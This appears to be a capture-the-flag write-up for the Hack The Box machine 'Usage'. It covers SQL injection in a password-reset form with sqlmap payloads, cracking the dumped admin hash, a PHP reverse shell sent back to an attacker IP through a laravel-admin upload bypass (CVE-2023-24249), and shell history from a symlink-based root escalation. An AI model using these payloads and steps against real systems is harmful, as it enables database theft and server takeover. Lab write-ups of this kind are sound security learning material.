IP = `10.10.11.18`

### Enumeration
```bash
sudo nmap -p22,80 -sCV -A -Pn $IP
[SNIP] ... 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Daily Blogs
|_http-server-header: nginx/1.18.0 (Ubuntu)
... [SNIP]

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   37.18 ms 10.10.14.1
2   37.24 ms usage.htb (10.10.11.18)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.59 seconds
```
Domain found `usage.htb`. 

After trying some random stuff and running `gobuster` directory brute forcing, I didn't find anything useful. However after making an account and heading to `/forgot-password` I found an SQLi in the `email` input. Ex:
`email=a@a.com' AND 1=1;-- -`
```bash
cat reqq.txt 
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://usage.htb
Connection: close
Referer: http://usage.htb/forget-password
Cookie: XSRF-TOKEN=eyJpdiI6Ii82RmVtOXhNc05Gcm92c0xmY3J4Wmc9PSIsInZhbHVlIjoiSjlidzhvVDBXMEF6ajhvUGg2cVRwQ2pJRXB1SDViZnFJWGIzQU1KbUlvOGU2UWxEVVFBWEtqVGpDT2xidW5iNTBZYjJsS2pzT000amNHcjB2dldEQzB1RnQ3VWtJOHZJV1QvSGNaVTlGTGx1L0xUS1JCZWI3eVJmZXBlNnl6aGoiLCJtYWMiOiJiZDBjNTA5MTY5YmI5OGRlYzYwOTdmYTkwZTg2OTQ1NmQ1MDM0ZDRiMmU3YWYxNDMzMTE1MDg5NWQxYTM4MWFkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Im1IK0xjL2p5T0hHOGx5NWVDV2wxeUE9PSIsInZhbHVlIjoiQTBKNDJWOU9uNHljdlVGMldJemYrWS8rOXAycXB0TStnSG1zU2paZDU2Qy9tY21YZ1kyZzhkWHFSUlRGTHU3Y3RuNWFaejFGU3FjdlFjRjdXaEpKeVFCSjliUERvcXVqbERQOVV3cjZGNkFGNVp2Q2IvWTdsQ0M2Z1RYTnd2MVAiLCJtYWMiOiJhOWE4YWYyZGE5NDhiYTc5NGY0MTUwYThjYzE0ODE5NGYxOGQyNzU2YzkyZmVkODA3ZDNhZTcyMTAzYzE0MjMxIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1

_token=BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&email=+a%40a.com

```
After capturing this request using burpsuite and running it through `sqlmap` I didn't find a ton of useful information the first few times however after turning up the risk/level paramter's and adding some other's I was able to find the database table `usage_blog` that could be targeted more specifically.

```bash
sqlmap -r reqq.txt -p email --batch --level 5 --risk 3 --dbms=mysql --dbs --dump --tables --threads 5

[13:08:07] [INFO] parsing HTTP request from 'reqq.txt'
[13:08:07] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
[SNIP] ...

[13:13:39] [INFO] checking if the injection point on POST parameter 'email' is a false positive
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 722 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&email= a@a.com' AND 1005=(SELECT (CASE WHEN (1005=1005) THEN 1005 ELSE (SELECT 3960 UNION SELECT 3913) END))-- -

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=BDou88iee4DWi2UbrIeFOOqp5zIUYNj0VOia0XA6&email= a@a.com' AND 9393=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- cnFS
---
[13:13:47] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
[13:13:48] [INFO] fetching database names
[13:13:48] [INFO] fetching number of databases
[13:13:48] [INFO] retrieved: 3
[13:13:50] [INFO] retrieving the length of query output
[13:13:50] [INFO] retrieved: 18
[13:14:19] [INFO] retrieved: information_schema             
[13:14:19] [INFO] retrieving the length of query output
[13:14:19] [INFO] retrieved: 18
[13:14:47] [INFO] retrieved: performance_schema             
[13:14:47] [INFO] retrieving the length of query output
[13:14:47] [INFO] retrieved: 10
[13:15:07] [INFO] retrieved: usage_blog             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog
```
`information_schema` - Standardized set of read-only views that provide information about all the SQL Server objects (databases, tables, columns, etc.). 
`performance_chema` - Provides a way to inspect internal execution of the server at runtime. It includes a number of tables that can be queried to assess the performance of various operations to diagnose problems.
`usage_blog` - Blog database

![[Pasted image 20240424135006.png]]

As you can see we successfully got the hash for the `Administrator` from the db/table: `usage_blog.admin_users`.

After copying the hash and echoing it to a file, then running `hashid -m <file>` on it... It output's the mode as:
```bash
hashid -m hash                                            
--File 'hash'--
Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash'-- 
```

Then running hashcat:
```bash
hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
```

Credentials found: `administrator:whatever1`

The credentials didn't work on the original login page so I then though of running gobuster dns enumeration using the wordlist `/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt`. 

```bash
gobuster dns -d 'usage.htb'  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     usage.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: admin.usage.htb
---
[SNIP]
```

Here... the credentials worked just fine... `admin:whatever1`

### Foothold
- [CVE-2023-24249](https://flyd.uk/post/cve-2023-24249/) - RCE in larravel-admin that allows attackers to bypass file upload restrictions, and attackers can upload files in `*.php` format for code execution.

Using a tool I wrote, I then created a php reverse shell file using the `PentestMonkey` PHP reverse shell script.
```bash
genrevshell php -f shell.php -i 10.10.14.40 -p 4444 
---
[+] shell.php generated successfully using the PHP Reverse shell script!
```

After logging in, we can see it is a laravel-admin dashboard for managing services etc. getting a peek at what the site is running, we can see it is running `Laravel` version `10.18.0`. 

After a bit of research I found the CVE mentioned above and gave it a shot.

The CVE here basically is when changing the `.jpg` favicon image for the profile photo, you can intercept the request and change the file extension to `.php` which the server will then execute.

So, using `shell.php` from earlier that I generated; i simply made a copy of the reverse shell as `shell.jpg` and gave it a shot...

```bash
11  cd /var/www/html
   12  ls
   13  cat root.txt
   14  file root.txt
   15  strings ~/root/root.txt
   16  uname -a
   17  n
   18  uname -m
   19  cat /proc/version
   20  touch '@root.txt'
   21  ln -s -r /root/root.txt root.txt
   22  rm -f root.txt
   23  ln -s -r /root/root.txt root.txt
   24  sudo /usr/bin/usage_management
   
```

don't ask... just know it works.

poggers

